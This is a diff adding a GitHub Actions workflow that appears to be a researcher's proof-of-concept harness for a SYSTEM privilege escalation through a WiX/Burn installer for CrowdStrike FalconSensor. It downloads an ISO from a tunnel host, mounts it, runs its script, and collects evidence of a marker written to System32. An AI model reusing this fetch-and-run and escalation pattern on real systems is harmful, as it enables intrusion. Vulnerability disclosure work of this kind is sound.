@@ -1,0 +1,72 @@
+name: exact-current-wix-safe-proof
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  proof:
+    runs-on: windows-2025
+    timeout-minutes: 20
+    steps:
+      - name: Download exact researcher-hosted proof ISO
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $u = 'https://xjyjc-2600-1f18-68f7-2200-4028-bfd8-81ac-b103.free.pinggy.net/falcon-wix-poc.iso'
+          $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+          Invoke-WebRequest -Uri $u -Headers @{'X-Pinggy-No-Screen-Cookie'='true'} -WebSession $s -OutFile "$env:RUNNER_TEMP\pinggy-init.bin"
+          Invoke-WebRequest -Uri $u -WebSession $s -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
+          $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
+          Write-Host "ISO SHA256=$h"
+          if ($h -ne '0a51ebd4eb630faa3c135eadbfc5e96de2f79f7a88f2c9a6ed74780b169edc0e') { throw 'ISO hash mismatch' }
+          $img=Mount-DiskImage -ImagePath "$env:RUNNER_TEMP\falcon-wix-poc.iso" -PassThru
+          $drive=(Get-Volume -DiskImage $img).DriveLetter
+          if (-not $drive) { throw 'No mounted drive' }
+          "POC_DRIVE=$drive" | Out-File -FilePath $env:GITHUB_ENV -Append
+          Write-Host "Mounted $drive`:"
+      - name: Run low-privilege watcher and exact installer as SYSTEM
+        shell: cmd
+        run: |
+          call %POC_DRIVE%:\run-system.cmd
+          timeout /t 35 /nobreak
+      - name: Collect proof
+        if: always()
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $out="$env:RUNNER_TEMP\proof-summary.txt"
+          "=== $(Get-Date -Format o) ===" | Set-Content $out
+          "--- runner ---" | Add-Content $out
+          whoami /all | Add-Content $out
+          "--- burnlow ---" | Add-Content $out
+          cmd /c 'net user burnlow' | Add-Content $out
+          "--- tasks ---" | Add-Content $out
+          schtasks /query /tn BurnLowWatcher /v /fo list | Add-Content $out
+          schtasks /query /tn BurnSystemInstaller /v /fo list | Add-Content $out
+          "--- protected input ACL and hash ---" | Add-Content $out
+          icacls C:\poc\readonly\FalconSensor.exe | Add-Content $out
+          Get-FileHash C:\poc\readonly\FalconSensor.exe -Algorithm SHA256 | Format-List | Out-String | Add-Content $out
+          "--- low watcher log ---" | Add-Content $out
+          if (Test-Path C:\poc\results\watcher.log) { Get-Content C:\poc\results\watcher.log | Add-Content $out; Copy-Item C:\poc\results\watcher.log "$env:RUNNER_TEMP\watcher.log" -Force }
+          "--- SYSTEM marker ---" | Add-Content $out
+          if (Test-Path C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt) { Get-Content C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt | Add-Content $out; Get-Acl C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt | Format-List | Out-String | Add-Content $out } else { 'MARKER ABSENT' | Add-Content $out }
+          Get-Content $out
+      - name: Upload proof artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: exact-current-wix-proof
+          path: |
+            ${{ runner.temp }}/proof-summary.txt
+            ${{ runner.temp }}/watcher.log
+          if-no-files-found: warn
+      - name: Cleanup
+        if: always()
+        shell: pwsh
+        run: |
+          Stop-Process -Name watcher -Force -ErrorAction SilentlyContinue
+          Stop-Process -Name FalconSensor -Force -ErrorAction SilentlyContinue
+          Unregister-ScheduledTask -TaskName BurnLowWatcher -Confirm:$false -ErrorAction SilentlyContinue
+          Unregister-ScheduledTask -TaskName BurnSystemInstaller -Confirm:$false -ErrorAction SilentlyContinue
+          Remove-Item C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt -Force -ErrorAction SilentlyContinue
+          Remove-LocalUser burnlow -ErrorAction SilentlyContinue
